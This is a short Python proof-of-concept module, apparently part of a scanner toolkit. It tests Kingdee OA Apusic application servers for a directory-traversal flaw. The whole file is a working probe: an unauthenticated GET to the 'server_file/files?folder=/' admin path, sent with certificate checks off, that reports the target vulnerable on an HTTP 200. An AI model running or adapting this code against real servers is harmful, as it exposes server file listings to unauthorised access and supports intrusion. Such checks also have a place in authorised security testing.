import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging
import urllib3

def 金蝶OA_Apusic应用服务器_目录遍历(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
    }
    plani_url = urldata + 'admin/protected/selector/server_file/files?folder=/'
    try:
        requests.packages.urllib3.disable_warnings()
        respones1 = requests.get(plani_url, headers=headers, verify=False)
        if respones1.status_code == 200:
            print(Vcolors.RED + "[+] 金蝶OA Apusic应用服务器server_file 目录遍历漏洞存在{}".format(plani_url) +Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 金蝶 Apusic应用服务器server_file 目录遍历漏洞不存在" +Vcolors.ENDC)

    except Exception as  e:
        print(e)

        logging.error("金蝶OA_Apusic应用服务器_目录遍历脚本出现异常")




